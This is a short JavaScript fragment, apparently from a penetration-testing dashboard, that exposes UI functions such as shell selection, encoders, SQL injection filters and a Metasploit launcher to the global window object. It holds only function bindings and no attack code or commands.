window.debouncedFilterPrivEsc = debouncedFilterPrivEsc;
window.renderADCommands = renderADCommands;
window.selectManualTool = selectManualTool;
window.lookupCVEsFor = lookupCVEsFor;
window.runToolOn = runToolOn;
window.chainToTool = chainToTool;
window.removePipelineStep = removePipelineStep;
window.updatePipelineStep = updatePipelineStep;
window.viewHistoryOutput = viewHistoryOutput;
window.rerunFromHistory = rerunFromHistory;
window.runDiff = runDiff;
window.launchMetasploit = launchMetasploit;
window.filterShells = filterShells;
window.selectShell = selectShell;
window.filterEncoder = filterEncoder;
window.runEncoder = runEncoder;
window.filterPortCat = filterPortCat;
window.jumpToTool = jumpToTool;
window.downloadPreset = downloadPreset;
window.removeScopeTarget = removeScopeTarget;
window.removeScopeExclusion = removeScopeExclusion;
window.toggleAccordion = toggleAccordion;
window.toggleChecklistItem = toggleChecklistItem;
window.toggleChecklistNotes = toggleChecklistNotes;
window.saveChecklistNote = saveChecklistNote;
window.openNote = openNote;
window.previewEvidence = previewEvidence;
window.removeEvidence = removeEvidence;
window.filterSQLiCat = filterSQLiCat;
window.filterPrivEscFn = filterPrivEscFn;
window.refreshWordlistOptions = refreshWordlistOptions;
window.showModal = showModal;
